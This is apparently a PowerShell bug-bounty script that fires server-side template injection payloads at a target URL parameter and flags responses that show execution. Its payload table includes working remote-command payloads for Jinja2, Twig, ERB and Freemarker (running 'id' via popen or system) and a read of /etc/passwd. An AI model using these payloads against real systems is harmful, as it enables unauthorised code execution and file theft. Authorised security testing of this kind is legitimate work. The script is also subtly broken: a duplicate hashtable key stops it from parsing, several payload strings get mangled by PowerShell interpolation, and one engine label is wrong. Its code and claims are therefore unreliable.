# Bug Hunter - SSTI Testing Tool
# Usage: ./test-ssti.ps1 -Target <url> -Param <param>

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    [string]$Param = "input",
    [switch]$All,
    [switch]$Jinja2,
    [switch]$Twig,
    [switch]$ERB,
    [switch]$Freemarker
)

Write-Host "[*] SSTI Testing for: $Target" -ForegroundColor Cyan

$results = @()

# SSTI Detection Payloads
$sstiPayloads = @{
    # Generic/Common
    "{{7*7}}" = "Generic 7*7"
    "{{7*'7'}}" = "Jinja2 7777777"
    "${7*7}" = "Freemarker 49"
    "<%= 7*7 %>" = "ERB 49"
    "#{7*7}" = "Mako 49"
    "*{7*7}" = "Thymeleaf 49"
    
    # Jinja2
    "{{config}}" = "Jinja2 config"
    "{{config.__class__.__init__.__globals__}}" = "Jinja2 globals"
    "{{request}}" = "Jinja2 request"
    "{{url_for}}" = "Jinja2 url_for"
    "{{lipsum}}" = "Jinja2 lipsum"
    
    # Twig
    "{{['id']|filter('system')}}" = "Twig system"
    "{{[1,2,3]|map('system')}}" = "Twig map"
    "{{7*'7'}}" = "Twig 7777777"
    
    # ERB (Ruby)
    "<%= system('id') %>" = "ERB system"
    "<%= `id` %>" = "ERB backtick"
    "<%= File.read('/etc/passwd') %>" = "ERB File read"
    
    # Freemarker
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}" = "Freemarker Execute"
    "${product.class.protectionDomain.classLoader.urls}" = "Freemarker classloader"
    
    # RCE Payloads (use only with authorization)
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" = "Jinja2 RCE"
    "{{request.application.__class__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}" = "Jinja2 RCE 2"
}

function Test-SSTI {
    param($payload, $description)
    
    Write-Host "[*] Testing: $description" -ForegroundColor Gray
    
    try {
        $separator = if ($Target -match "\?") { "&" } else { "?" }
        $testUrl = "$Target$separator$Param=$([System.Uri]::EscapeDataString($payload))"
        
        $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
        
        # Check for template engine indicators
        $detectionIndicators = @{
            "49" = "Template executed (49)"
            "7777777" = "Jinja2 detected"
            "root:" = "ERB /etc/passwd"
            "uid=" = "RCE successful (id)"
            "freemarker" = "Freemarker error"
            "jinja2" = "Jinja2 error"
            "Twig" = "Twig error"
        }
        
        foreach ($indicator in $detectionIndicators.GetEnumerator()) {
            if ($response.Content -match $indicator.Key) {
                Write-Host "[!] SSTI FOUND: $description" -ForegroundColor Red
                return @{Payload=$payload; Description=$description; Indicator=$indicator.Key}
            }
        }
        
        # Check for template errors
        if ($response.Content -match "Template property|undefined variable|not found in") {
            Write-Host "[!] SSTI FOUND: $description (error)" -ForegroundColor Red
            return @{Payload=$payload; Description=$description; Type="Error"}
        }
        
    } catch {}
    
    return $null
}

# Run tests
if ($All -or -not $Jinja2 -and -not $Twig -and -not $ERB -and -not $Freemarker) {
    Write-Host "[*] Running full SSTI tests..." -ForegroundColor Yellow
    
    foreach ($payload in $sstiPayloads.GetEnumerator()) {
        $result = Test-SSTI -payload $payload.Key -description $payload.Value
        if ($result) { $results += $result }
    }
}

# Template-specific tests
if ($Jinja2 -or $All) {
    Write-Host "[*] Testing Jinja2-specific..." -ForegroundColor Yellow
    
    $jinja2Payloads = @(
        "{{7*7}}",
        "{{config}}",
        "{{request}}",
        "{{url_for}}",
        "{{lipsum}}"
    )
    
    foreach ($payload in $jinja2Payloads) {
        Test-SSTI -payload $payload -description "Jinja2: $payload"
    }
}

if ($Twig -or $All) {
    Write-Host "[*] Testing Twig-specific..." -ForegroundColor Yellow
    
    $twigPayloads = @(
        "{{7*7}}",
        "{{['id']|filter('system')}}",
        "{{[1,2,3]|map('system')}}"
    )
    
    foreach ($payload in $twigPayloads) {
        Test-SSTI -payload $payload -description "Twig: $payload"
    }
}

if ($ERB -or $All) {
    Write-Host "[*] Testing ERB-specific..." -ForegroundColor Yellow
    
    $erbPayloads = @(
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>"
    )
    
    foreach ($payload in $erbPayloads) {
        Test-SSTI -payload $payload -description "ERB: $payload"
    }
}

# Output results
Write-Host "`n[*] SSTI Testing Complete" -ForegroundColor Green
Write-Host "[*] Found $($results.Count) potential SSTI vulnerabilities" -ForegroundColor Cyan

foreach ($result in $results) {
    Write-Host "  - $($result.Description): $($result.Payload)" -ForegroundColor White
}

# Save results
$resultsFile = "./bug-hunter-output/ssti-results.txt"
if (!(Test-Path "./bug-hunter-output")) {
    New-Item -ItemType Directory -Path "./bug-hunter-output" -Force | Out-Null
}

$results | ConvertTo-Json | Set-Content $resultsFile
Write-Host "[*] Results saved to: $resultsFile" -ForegroundColor Green